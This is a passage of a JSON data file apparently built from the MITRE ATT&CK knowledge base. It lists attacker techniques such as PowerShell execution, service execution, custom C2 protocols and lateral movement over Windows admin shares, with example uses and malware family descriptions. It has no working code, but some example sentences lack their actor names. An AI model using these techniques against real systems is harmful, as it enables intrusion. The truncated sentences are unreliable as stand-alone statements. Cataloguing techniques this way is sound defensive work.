      "can collect the current time on a victim machine.",
      "During  the threat actors used the `net time` command as part of their advanced reconnaissance.",
      "has the capability to obtain the time zone information and current timestamp of the victims machine.",
      "can check the current date-time value of the compromised system comparing it to the hardcoded execution trigger and can send the current timestamp to the C2 server.",
      "uses the current UTC victim system date for domain generation and connects to time servers to determine the current date.",
      "During  threat actors used the `time` command to retrieve the current time of a compromised system.",
      "can collect the timestamp from the victims machine.",
      "can determine the local time on targeted machines.",
      "can obtain the `DATETIME` and `UPTIME` from a compromised machine.",
      "has used a reconnaissance module that can be used to retrieve the date and time of the system.",
      "can identify the system time on a targeted host.",
      "uses the command net time \\\\127.0.0.1 to get information the systems time.",
      "used a function to gather the current time.",
      "contains functionality to query the local/system time.",
      "has the ability to determine the date and time on a compromised host.",
      "uses JavaScript to get the system time.",
      "can collect the current timestamp of the victim's machine.",
      "can determine the time on the victim machine via IPinfo.",
      "can collect time zone information and system `UPTIME`.",
      "can use the `GetTickCount` and `GetSystemTimeAsFileTime` API calls to inspect system time.",
      "can obtain the current date and time of the victim machine.",
      "collected device `UPTIME`.",
      "has the ability to determine the local time to ensure malware installation only happens during the hours that the infected system is active.",
      "has used a tool to capture the time on a compromised host in order to register it with C2.",
      "has the ability to determine local time on a compromised host.",
      "can compare the current time on an infected host with a configuration value to determine when to start the encryption process.",
      "can collect start time information from a compromised host.",
      "has commands to get the time the machine was built the time and the time zone.",
      "can collect the time on the compromised host.",
      "has a command to collect the system `UPTIME`.",
      "can check system time to help determine when changes were made to specified files.",
      "gathers the time zone information from the victims machine.",
      "can collect the time zone from the victim's machine.",
      "malware can obtain system time from a compromised host.",
      "can collect time zone information.",
      "collects the current system time (UTC) and sends it back to the C2 server.",
      "can send time zone information from a compromised host to C2.",
      "has used time /t and net time \\\\ip/hostname for system time discovery.",
      "can collect the time zone information from the system.",
      "can collect the current time zone information from the victims machine.",
      "creates a log file for capturing keylogging clipboard and related data using the victim host's current date for the filename.  queries victim system epoch time during execution.  captures system time information as part of automated profiling on initial installation.",
      "can determine the current time.",
      "can execute GetLocalTime for time discovery.",
      "During  the threat actors used the command `net view /all time` to gather the local time of a compromised network.",
      "has checked the victim system's date and time to perform tasks during business hours (9 to 5 Monday to Friday).",
      "collects the time and date of a system when it is infected.",
      "has been observed collecting system time from victim machines.",
      "can collect the local time on a compromised host.",
      "As part of the data reconnaissance phase  grabs the system time to send back to the control server.",
      "checks to see if the system is configured with Daylight time and checks for a specific region to be set for the timezone.",
      "gathers the local system time from the victims machine.",
      "has the ability to identify the current date and time on the compromised host.",
      "can collect the date and time from a compromised host.",
      "can obtain the date and time of the compromised system.",
      "can check the system time set on the infected host.",
      "can pull a timestamp from the victim's machine.",
      "has checked the system time before and after encryption.",
      "has checked the current date on the victim system.",
      "has the ability to generate the current date and time.",
      "has obtained the victim's system timezone.",
      "gathers victim machine timezone information.",
      "deployed mechanisms to check system time information following strategic website compromise attacks.",
      "can identify the system local time information.",
      "will set a timestamp value to determine when wiping functionality starts. When the timestamp is met on the system a trigger file is created on the operating system allowing for execution to proceed. If the timestamp is in the past the wiper will execute immediately.",
      "reads the infected system's current time and writes it to a log file during execution.",
      "retrieves a system timestamp that is used in generating an encryption key."
    ],
    "id": "T1124",
    "name": "System Time Discovery",
    "similar_words": [
      "System Time Discovery"
    ]
  },
  "attack-pattern--f44731de-ea9f-406d-9b83-30ecbb9b4392": {
    "description": "Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with [New Service](https://attack.mitre.org/techniques/T1050) and [Modify Existing Service](https://attack.mitre.org/techniques/T1031) during service persistence or privilege escalation.",
    "example_uses": [
      "has used a tool known as RemoteExec (similar to ) to remotely execute batch scripts and binaries.",
      "can run a command on another machine using .",
      "launches a DLL file that gets executed as a service using svchost.exe",
      "can execute commands remotely by creating a new service on the remote system.",
      "registers itself as a service on the victim’s machine to run as a standalone process.",
      "uses svchost.exe to execute a malicious DLL included in a new service group.",
      "installs a service on the remote system, executes the command, then uninstalls the service.",
      "uses  to execute a payload or commands on a remote host.",
      "uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.",
      "can start, stop, or delete services.",
      "can use  to execute a payload on a remote host. It can also use Service Control Manager to start new services.",
      "Microsoft Sysinternals  is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.",
      "can be used to execute binaries on remote systems by creating and starting a service.",
      "The net start and net stop commands can be used in  to execute or stop Windows services.",
      "uses  to perform remote service manipulation to execute a copy of itself as part of lateral movement.",
      "creates a new service named “ntssrv” to execute the payload."
    ],
    "id": "T1035",
    "name": "Service Execution",
    "similar_words": [
      "Service Execution"
    ]
  },
  "attack-pattern--f4882e23-8aa7-4b12-b28a-b349c12ee9e0": {
    "description": "PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. \n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including Empire, (Citation: Github PowerShell Empire) PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)",
    "example_uses": [
      "used PowerShell commands to execute payloads.",
      "There is a variant of  that uses a PowerShell script instead of the traditional PE form.",
      "uses PowerShell for execution.",
      "can launch PowerShell Scripts.",
      "leveraged PowerShell to download and execute additional scripts for execution.",
      "malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim’s machine.",
      "has used powershell.exe to download and execute scripts.",
      "used PowerShell scripts for execution.",
      "has used a custom executable to execute PowerShell scripts.",
      "downloads and executes PowerShell scripts.",
      "uses PowerShell scripts for execution.",
      "leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance.",
      "can write and execute PowerShell scripts.",
      "has used PowerShell for execution.",
      "has a module for loading and executing PowerShell scripts.",
      "uses PowerShell.",
      "has used PowerShell for execution of a payload.",
      "malicious spearphishing payloads are executed as .  has also used  during and.",
      "modules are written in and executed via .",
      "has used PowerShell for execution.",
      "has used PowerShell for execution.",
      "One version of  uses a PowerShell script.",
      "has used PowerShell for execution and privilege escalation.",
      "has used PowerShell Empire.",
      "uses PowerShell for execution.",
      "is written in PowerShell.",
      "has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.",
      "uses a PowerShell script to launch shellcode that retrieves an additional payload.",
      "has used PowerShell-based tools and shellcode loaders for execution.",
      "can execute a payload on a remote host with PowerShell. This technique does write any data to disk.",
      "has used PowerShell for execution.",
      "is known to use PowerShell.",
      "downloads a PowerShell script that decodes to a typical shellcode loader.",
      "uses PowerShell for execution as well as PowerShell Empire to establish persistence.",
      "uses PowerShell to execute various commands, one to execute its payload.",
      "uses a module to execute Mimikatz with PowerShell to perform .",
      "can execute PowerShell scripts.",
      "is a PowerShell backdoor.",
      "uses  to inject shellcode into PowerShell.",
      "used  to download payloads, run a reverse shell, and execute malware on the victim's machine.",
      "malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.",
      "has used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.",
      "The 's Information Gathering Tool (IGT) includes PowerShell components.",
      "has used PowerShell on victim systems to download and run payloads after exploitation.",
      "has used encoded PowerShell scripts uploaded to  installations to download and install .  also used PowerShell scripts to evade defenses.",
      "has used PowerShell scripts to download and execute programs in memory, without writing to disk."
    ],
    "id": "T1086",
    "name": "PowerShell",
    "similar_words": [
      "PowerShell"
    ]
  },
  "attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe": {
    "description": "Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)",
    "example_uses": [
      "has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses."
    ],
    "id": "T1216",
    "name": "System Script Proxy Execution",
    "similar_words": [
      "Signed Script Proxy Execution",
      "System Script Proxy Execution"
    ]
  },
  "attack-pattern--f72eb8a8-cd4c-461d-a814-3f862befbf00": {
    "description": "Adversaries may communicate using a custom command and control protocol instead of encapsulating commands/data in an existing [Standard Application Layer Protocol](https://attack.mitre.org/techniques/T1071). Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.",
    "example_uses": [
      "uses a custom TCP protocol for C2.",
      "binds to a raw socket on a random source port between 31800 and 31900 for C2.",
      "network traffic communicates over a raw socket.",
      "The  malware platform can use ICMP to communicate between infected computers.",
      "uses raw sockets to communicate with its C2 server.",
      "communicates over raw TCP.",
      "has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.",
      "uses a custom binary protocol for C2 communications.",
      "communicates via ICMP for C2.",
      "completes network communication via raw sockets.",
      "If  does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number,  will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.",
      "network traffic can communicate over a raw socket.",
      "Some  variants use raw TCP for C2.",
      "uses a custom DNS tunneling protocol for C2.",
      "communicates with its C2 servers through a TCP socket.",
      "A  variant uses fake TLS to communicate with the C2 server.",
      "can be configured to use raw TCP or UDP for command and control.",
      "C2 traffic can communicate via TCP raw sockets.",
      "is capable of using ICMP, TCP, and UDP for C2.",
      "uses a custom UDP protocol to communicate.",
      "provides a reverse shell connection on 8338/TCP, encrypted via AES.",
      "A  variant uses a C2 mechanism similar to port knocking that allows attackers to connect to a victim without leaving the connection open for more than a few sectonds.",
      "connects to C2 infrastructure and establishes backdoors over a custom communications protocol.",
      "credential stealer ZUMKONG emails credentials from the victim using HTTP POST requests.",
      "has used custom DNS Tunneling protocols for C2.",
      "uses a custom binary protocol to beacon back to its C2 server. It has also used XOR for encrypting communications.",
      "allows adversaries to modify the way the \"beacon\" payload communicates. This is called \"Malleable C2\" in the  manual and is intended to allow a penetration test team to mimic known APT C2 methods.",
      "uses 's malleable C2 functionality to blend in with network traffic.",
      "can communicate to its C2 over TCP using a custom binary protocol.",
      "uses HTTP POST requests with data formatted using a custom protocol.",
      "is capable of using its command and control protocol over port 443. However, Duqu is also capable of encapsulating its command protocol over standard application layer protocols. The Duqu command and control protocol implements many of the same features as TCP and is a reliable transport protocol."
    ],
    "id": "T1094",
    "name": "Custom Command and Control Protocol",
    "similar_words": [
      "Custom Command and Control Protocol"
    ]
  },
  "attack-pattern--f792d02f-813d-402b-86a5-ab98cb391d3b": {
    "description": "InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe and C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe. InstallUtil.exe is digitally signed by Microsoft.\n\nAdversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)]. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)",
    "example_uses": [],
    "id": "T1118",
    "name": "InstallUtil",
    "similar_words": [
      "InstallUtil"
    ]
  },
  "attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e": {
    "description": "Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)",
    "example_uses": [
      "attempted to contact the C2 server over TCP using port 80.",
      "uses port 443 for the control server communications.",
      "uses port 443 for C2.",
      "variants can use ports 443, 8443, and 8080 for communications.",
      "has used ports 53, 80, 443, and 8080 for C2.",
      "used SMB over ports 445 or 139 for C2. The group also established encrypted connections over port 443.",
      "uses port 8000 and 443 for C2.",
      "uses Port Numbers 443 and 80 for the C2 server.",
      "uses port 80 for C2.",
      "used TCP port 80 for C2.",
      "uses 443 for C2 communications.",
      "uses port 80 for C2.",
      "uses Port Numbers 80, 8080, 8000, and 443 for communication to the C2 servers.",
      "binds and listens on port 443.",
      "uses port 443 for C2 communications.",
      "uses port 443 for C2 communications.",
      "uses port 443 for C2.",
      "has used port 8080 for C2.",
      "has tunneled RDP backdoors over port 443.",
      "connects to external C2 infrastructure over port 443.",
      "connects to external C2 infrastructure over port 443.",
      "connects to external C2 infrastructure over the HTTP port.",
      "has used port 80 for C2.",
      "connects to external C2 infrastructure and opens a backdoor over port 443.",
      "uses commonly used ports (like HTTPS/443) for command and control.",
      "malware has communicated with C2 servers over port 6667 (for IRC) and port 8080.",
      "A variant of  attempts communication to the C2 server over HTTP on port 443.",
      "uses HTTP over port 443 for command and control.",
      "Some  variants use ports 8080 and 8000 for C2.",
      "uses a custom command and control protocol that communicates over commonly used ports. The C2 protocol is encapsulated in common application layer protocols.",
      "communicates over common ports such as TCP 80, 443, and 25.",
      "communicates with its C2 domain over ports 443 and 8443.",
      "connects over 443 for C2.",
      "communicates with its C2 server over port 443.",
      "communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.",
      "uses a specific port of 443 and can also use ports 53 and 80 for C2. One  variant uses HTTP over port 443 to connect to its C2 server.",
      "uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.",
      "One  variant connected to its C2 server over port 8080.",
      "operates over ports 21 and 20.",
      "command and control occurs via HTTPS over port 443.",
      "network traffic communicates over common ports like 80, 443, or 1433.",
      "beacons to destination port 443.",
      "uses ports 80, 443, and 8080 for C2.",
      "has beaconed to its C2 over port 443.",
      "is a RAT that communicates with HTTP.",
      "communicates over port 80 for C2.",
      "has used TCP port 8080 for C2.",
      "uses HTTP TCP port 80 and HTTPS TCP port 443 for communications.",
      "uses port 8080 for C2.",
      "Some  malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes commonly used ports such as 443, 53, 80, 25, and 8080.",
      "C2 traffic for most  tools occurs over Port Numbers 53, 80, and 443."
    ],
    "id": "T1043",
    "name": "Commonly Used Port",
    "similar_words": [
      "Commonly Used Port"
    ]
  },
  "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b": {
    "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",
    "example_uses": [
      "has used CVE-2015-4902 to bypass security features.",
      "exploited CVE-2024-20399 in Cisco Switches to which the threat actor was already able to authenticate in order to escape the NX-OS command line interface and gain access to the underlying operating system for arbitrary command execution."
    ],
    "id": "T1211",
    "name": "Exploitation for Defense Evasion",
    "similar_words": [
      "Exploitation for Defense Evasion"
    ]
  },
  "attack-pattern--ff25900d-76d5-449b-a351-8824e62fc81b": {
    "description": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.Smart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microsoft cloud service before executing them.(Citation: Microsoft Smart App Control) However, adversaries may leverage \"reputation hijacking\" to abuse an operating systems trust of safe, signed applications that support the execution of arbitrary code. By leveraging [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127) to run their malicious code, adversaries may bypass Smart App Control protections.(Citation: Elastic Security Labs)",
    "example_uses": [
      "A version of  loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application whitelisting techniques."
    ],
    "id": "T1127",
    "name": "Trusted Developer Utilities Proxy Execution",
    "similar_words": [
      "Trusted Developer Utilities",
      "Trusted Developer Utilities Proxy Execution"
    ]
  },
  "attack-pattern--ffe742ed-9100-4686-9e00-c331da544787": {
    "description": "Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. \n\nAdversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over server message block (SMB) (Citation: Wikipedia SMB) to interact with systems using remote procedure calls (RPCs), (Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1035), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1075) and certain configuration and patch levels. (Citation: Microsoft Admin Shares)\n\nThe [Net](https://attack.mitre.org/software/S0039) utility can be used to connect to Windows admin shares on remote systems using net use commands with valid credentials. (Citation: Technet Net Use)",
    "example_uses": [
      "has copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.",
      "copies itself over network shares to move laterally on a victim network.",
      "has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context.",
      "can use Window admin shares (C$ and ADMIN$) for lateral movement.",
      "will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.",
      "has run a plug-in on a victim to spread through the local network by using  and accessing admin shares.",
      "Adversaries can instruct  to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.",
      "The  malware platform can use Windows admin shares to move laterally.",
      "accesses network share(s), enables share access to the target device, and copies an executable payload to the target system, and uses a  to execute the malware.",
      "uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.",
      "Lateral movement can be done with  through net use commands to connect to the on remote systems.",
      ", a tool that has been used by adversaries, writes programs to the ADMIN$ network share to execute commands on remote systems.",
      "malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement.",
      "actors mapped network drives using net use.",
      "used net use commands to connect to lateral systems within a network.",
      "uses net.exe to connect to network shares using net use commands with compromised credentials.",
      "actors have been known to copy files to the network shares of other computers to move laterally."
    ],
    "id": "T1077",
    "name": "Windows Admin Shares",
    "similar_words": [
      "Windows Admin Shares"
    ]
  },
  "malware--7bec698a-7e20-4fd3-bb6a-12787770fb1a": {
    "id": "S0066",
    "name": "3PARA RAT",
    "examples": [],
    "similar_words": [
      "3PARA RAT"
    ],
    "description": "[3PARA RAT](https://attack.mitre.org/software/S0066) is a remote access tool (RAT) programmed in C++ that has been used by [Putter Panda](https://attack.mitre.org/groups/G0024). (Citation: CrowdStrike Putter Panda)",
    "example_uses": []
  },
  "malware--8e461ca3-0996-4e6e-a0df-e2a5bbc51ebc": {
    "id": "S0065",
    "name": "4H RAT",
    "examples": [],
    "similar_words": [
      "4H RAT"
    ],
    "description": "[4H RAT](https://attack.mitre.org/software/S0065) is malware that has been used by [Putter Panda](https://attack.mitre.org/groups/G0024) since at least 2007. (Citation: CrowdStrike Putter Panda)",
    "example_uses": []
  },
  "malware--fb575479-14ef-41e9-bfab-0b7cf10bec73": {
    "id": "S0045",
    "name": "ADVSTORESHELL",
    "examples": [],
    "similar_words": [
      "ADVSTORESHELL",
      "AZZY",
      "EVILTOSS",
      "NETUI",
      "Sedreco"
    ],
    "description": "[ADVSTORESHELL](https://attack.mitre.org/software/S0045) is a spying backdoor that has been used by [APT28](https://attack.mitre.org/groups/G0007) from at least 2012 to 2016. It is generally used for long-term espionage and is deployed on targets deemed interesting after a reconnaissance phase. (Citation: Kaspersky Sofacy) (Citation: ESET Sednit Part 2)",
    "example_uses": []
  },
  "malware--56f46b17-8cfa-46c0-b501-dd52fef394e2": {
    "id": "S0073",
    "name": "ASPXSpy",
    "examples": [],
    "similar_words": [
      "ASPXSpy",
      "ASPXTool"
    ],
    "description": "[ASPXSpy](https://attack.mitre.org/software/S0073) is a Web shell. It has been modified by [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors to create the ASPXTool version. (Citation: Dell TG-3390)",
    "example_uses": []
  },
  "malware--40d3e230-ed32-469f-ba89-be70cc08ab39": {
    "id": "S0092",
    "name": "Agent.btz",
    "examples": [],
    "similar_words": [
      "Agent.btz"
    ],
    "description": "[Agent.btz](https://attack.mitre.org/software/S0092) is a worm that primarily spreads itself via removable devices such as USB drives. It reportedly infected U.S. military networks in 2008. (Citation: Securelist Agent.btz)",
    "example_uses": []
  },
  "malware--f5352566-1a64-49ac-8f7f-97e1d1a03300": {
    "id": "S0129",
    "name": "AutoIt backdoor",
    "examples": [],
    "similar_words": [
      "AutoIt backdoor"
    ],
    "description": "[AutoIt backdoor](https://attack.mitre.org/software/S0129) is malware that has been used by the actors responsible for the MONSOON campaign. The actors frequently used it in weaponized .pps files exploiting CVE-2014-6352. (Citation: Forcepoint Monsoon) This malware makes use of the legitimate scripting language for Windows GUI automation with the same name.",
    "example_uses": []
  },
  "malware--fb261c56-b80e-43a9-8351-c84081e7213d": {
    "id": "S0031",
    "name": "BACKSPACE",
    "examples": [],
    "similar_words": [
      "BACKSPACE",
      "Lecna"
    ],
    "description": "[BACKSPACE](https://attack.mitre.org/software/S0031) is a backdoor used by [APT30](https://attack.mitre.org/groups/G0013) that dates back to at least 2005. (Citation: FireEye APT30)",
    "example_uses": []
  },
  "malware--9dbdadb6-fdbf-490f-a35f-38762d06a0d2": {
    "id": "S0245",
    "name": "BADCALL",
    "examples": [],
    "similar_words": [
      "BADCALL"
    ],
    "description": "[BADCALL](https://attack.mitre.org/software/S0245) is a Trojan malware variant used by the group [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT BADCALL)",
    "example_uses": []
  },
  "malware--e9595678-d269-469e-ae6b-75e49259de63": {
    "id": "S0128",
    "name": "BADNEWS",
    "examples": [],
    "similar_words": [
      "BADNEWS"
    ],
    "description": "[BADNEWS](https://attack.mitre.org/software/S0128) is malware that has been used by the actors responsible for the [Patchwork](https://attack.mitre.org/groups/G0040) campaign. Its name was given due to its use of RSS feeds, forums, and blogs for command and control. (Citation: Forcepoint Monsoon) (Citation: TrendMicro Patchwork Dec 2017)",
    "example_uses": []
  },
  "malware--64d76fa5-cf8f-469c-b78c-1a4f7c5bad80": {
    "id": "S0127",
    "name": "BBSRAT",
    "examples": [],
    "similar_words": [
      "BBSRAT"
    ],
    "description": "[BBSRAT](https://attack.mitre.org/software/S0127) is malware with remote access tool functionality that has been used in targeted compromises. (Citation: Palo Alto Networks BBSRAT)",
    "example_uses": []
  },
  "malware--b8eb28e4-48a6-40ae-951a-328714f75eda": {
    "id": "S0017",
    "name": "BISCUIT",
    "examples": [],
    "similar_words": [
      "BISCUIT"
    ],
    "description": "[BISCUIT](https://attack.mitre.org/software/S0017) is a backdoor that has been used by [APT1](https://attack.mitre.org/groups/G0006) since as early as 2007. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "malware--d69c8146-ab35-4d50-8382-6fc80e641d43": {
    "id": "S0069",
    "name": "BLACKCOFFEE",
    "examples": [],
    "similar_words": [
      "BLACKCOFFEE"
    ],
    "description": "[BLACKCOFFEE](https://attack.mitre.org/software/S0069) is malware that has been used by several Chinese groups since at least 2013. (Citation: FireEye APT17) (Citation: FireEye Periscope March 2018)",
    "example_uses": []
  },
  "malware--da2ef4a9-7cbe-400a-a379-e2f230f28db3": {
    "id": "S0114",
    "name": "BOOTRASH",
    "examples": [],
    "similar_words": [
      "BOOTRASH"
    ],
    "description": "[BOOTRASH](https://attack.mitre.org/software/S0114) is a [Bootkit](https://attack.mitre.org/techniques/T1542/003) that targets Windows operating systems. It has been used by threat actors that target the financial sector.(Citation: Mandiant M Trends 2016)(Citation: FireEye Bootkits)(Citation: FireEye BOOTRASH SANS)",
    "example_uses": []
  },
  "malware--67fc172a-36fa-4a35-88eb-4ba730ed52a6": {
    "id": "S0014",
    "name": "BS2005",
    "examples": [],
    "similar_words": [
      "BS2005"
    ],
    "description": "[BS2005](https://attack.mitre.org/software/S0014) is malware that was used by [Ke3chang](https://attack.mitre.org/groups/G0004) in spearphishing campaigns since at least 2011. (Citation: Mandiant Operation Ke3chang November 2014)",
    "example_uses": []
  },
  "malware--123bd7b3-675c-4b1a-8482-c55782b20e2b": {
    "id": "S0043",
    "name": "BUBBLEWRAP",
    "examples": [],
    "similar_words": [
      "BUBBLEWRAP",
      "Backdoor.APT.FakeWinHTTPHelper"
    ],
    "description": "[BUBBLEWRAP](https://attack.mitre.org/software/S0043) is a full-featured, second-stage backdoor used by the [admin@338](https://attack.mitre.org/groups/G0018) group. It is set to run when the system boots and includes functionality to check, upload, and register plug-ins that can further enhance its capabilities. (Citation: FireEye admin@338)",
    "example_uses": []
  },
  "malware--083bb47b-02c8-4423-81a2-f9ef58572974": {
    "id": "S0093",
    "name": "Backdoor.Oldrea",
    "examples": [],
    "similar_words": [
      "Backdoor.Oldrea",
      "Havex"
    ],
    "description": "[Backdoor.Oldrea](https://attack.mitre.org/software/S0093) is a modular backdoor that used by [Dragonfly](https://attack.mitre.org/groups/G0035) against energy companies since at least 2013. [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) was distributed via supply chain compromise, and included specialized modules to enumerate and map ICS-specific systems, processes, and protocols.(Citation: Symantec Dragonfly)(Citation: Gigamon Berserk Bear October 2021)(Citation: Symantec Dragonfly Sept 2017)",
    "example_uses": []
  },
  "malware--835a79f1-842d-472d-b8f4-d54b545c341b": {
    "id": "S0234",
    "name": "Bandook",
    "examples": [],
    "similar_words": [
      "Bandook"
    ],
    "description": "[Bandook](https://attack.mitre.org/software/S0234) is a commercially available RAT, written in Delphi and C++, that has been available since at least 2007. It has been used against government, financial, energy, healthcare, education, IT, and legal organizations in the US, South America, Europe, and Southeast Asia. [Bandook](https://attack.mitre.org/software/S0234) has been used by [Dark Caracal](https://attack.mitre.org/groups/G0070), as well as in a separate campaign referred to as \"Operation Manul\".(Citation: EFF Manul Aug 2016)(Citation: Lookout Dark Caracal Jan 2018)(Citation: CheckPoint Bandook Nov 2020)",
    "example_uses": []
  },
  "malware--1f6e3702-7ca1-4582-b2e7-4591297d05a8": {
    "id": "S0239",
    "name": "Bankshot",
    "examples": [],
    "similar_words": [
      "Bankshot",
      "Trojan Manuscript"
    ],
    "description": "[Bankshot](https://attack.mitre.org/software/S0239) is a remote access tool (RAT) that was first reported by the Department of Homeland Security in December of 2017. In 2018, [Lazarus Group](https://attack.mitre.org/groups/G0032) used the [Bankshot](https://attack.mitre.org/software/S0239) implant in attacks against the Turkish financial sector. (Citation: McAfee Bankshot)",
    "example_uses": []
  },
  "malware--65ffc206-d7c1-45b3-b543-f6b726e7840d": {
    "id": "S0268",
    "name": "Bisonal",
    "examples": [],
    "similar_words": [
      "Bisonal"
    ],
    "description": "[Bisonal](https://attack.mitre.org/software/S0268) is a remote access tool (RAT) that has been used by [Tonto Team](https://attack.mitre.org/groups/G0131) against public and private sector organizations in Russia, South Korea, and Japan since at least December 2010.(Citation: Unit 42 Bisonal July 2018)(Citation: Talos Bisonal Mar 2020)",
    "example_uses": []
  },
  "malware--54cc1d4f-5c53-4f0e-9ef5-11b4998e82e4": {
    "id": "S0089",
    "name": "BlackEnergy",
    "examples": [],
    "similar_words": [
      "BlackEnergy",
      "Black Energy"
    ],
    "description": "[BlackEnergy](https://attack.mitre.org/software/S0089) is a malware toolkit that has been used by both criminal and APT actors. It dates back to at least 2007 and was originally designed to create botnets for use in conducting Distributed Denial of Service (DDoS) attacks, but its use has evolved to support various plug-ins. It is well known for being used during the confrontation between Georgia and Russia in 2008, as well as in targeting Ukrainian institutions. Variants include BlackEnergy 2 and BlackEnergy 3. (Citation: F-Secure BlackEnergy 2014)",
    "example_uses": []
  },
  "malware--28b97733-ef07-4414-aaa5-df50b2d30cc5": {
    "id": "S0252",
    "name": "Brave Prince",
    "examples": [],
    "similar_words": [
      "Brave Prince"
    ],
    "description": "[Brave Prince](https://attack.mitre.org/software/S0252) is a Korean-language implant that was first observed in the wild in December 2017. It contains similar code and behavior to [Gold Dragon](https://attack.mitre.org/software/S0249), and was seen along with [Gold Dragon](https://attack.mitre.org/software/S0249) and [RunningRAT](https://attack.mitre.org/software/S0253) in operations surrounding the 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon)",
    "example_uses": []
  },
